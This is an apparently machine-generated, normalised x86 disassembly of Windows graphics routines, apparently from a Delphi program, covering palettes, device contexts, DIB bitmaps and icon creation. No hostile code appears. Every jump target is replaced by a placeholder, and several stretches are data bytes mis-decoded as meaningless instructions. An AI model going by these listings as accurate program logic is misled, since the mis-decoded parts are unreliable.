mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41e7b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41e836
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41e848
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028d8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41e640
mov eax esp
call sub_41e7b0
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41e8ec
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41e640
mov [ esp ] eax
sub_41e940
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41e2e8
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41e2c8
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41eaec
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41e158
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ea12
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41e168
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea19
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41e05c
sub_41ea19
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41e2e8
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41e158
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41eacc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41e168
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ead3
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41eb08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41eb98
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407b64
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41ee8f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41ec81
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41e05c
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec88
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41ec88
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41eafc
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407b64
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41ee6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41e940
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407b64
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41ee4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee53
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026fc
retn
call sub_41e0b0
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41eafc
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41eb08
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41eeb8
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41e038
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b98
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41e2e8
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41ef9c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41eeb8
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41f008
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41eeb8
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f0a5
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f0ac
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41f0dc
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402b98
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402b98
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41f0d0
xor edx edx
push ebp
push sub_41f2ca
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41ef9c
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41ef9c
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41f2a3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407b64
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407b64
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407b64
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407b64
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41f008
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41f008
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2aa
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026fc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026fc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026fc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026fc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41f2aa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2d1
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41f2d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403168
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41f328
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41f380
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41f328
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f3c9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4030e0
mov edi eax
mov eax esi
call sub_4030e0
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f503
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f4e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407c90
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f4ed
mov al 0x1
sub_41f51c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4161a4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f564
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f56b
mov eax [ ebp - 0x4 ]
call sub_403198
retn
sub_41f570
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41f5a4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4161a4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f5ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5f6
mov eax [ ebp - 0x4 ]
call sub_403198
retn
sub_41f620
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
test al 0x42
inc ecx
add [ eax ] ah
aas
inc ecx
add [ edi + edi + 0x54100041 ] bl
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
popad
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
xchg esp eax
test [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 8 + 0x100041 ] ah
add [ eax ] al
mov [ ecx + eax * 2 ] ds
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ah
add [ eax ] al
movsb [ edi ] [ esi ]
mov edx r-xdata
mov eax esi
call sub_41f838
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41f838
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_41f838
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f79c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f0c
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41f795
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403168
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41f838
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_4034bc
sub_41f6b8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41f795
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403168
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41f838
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_41f838
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41f838
push 0x0
mov eax [ r-xdata ]
push eax
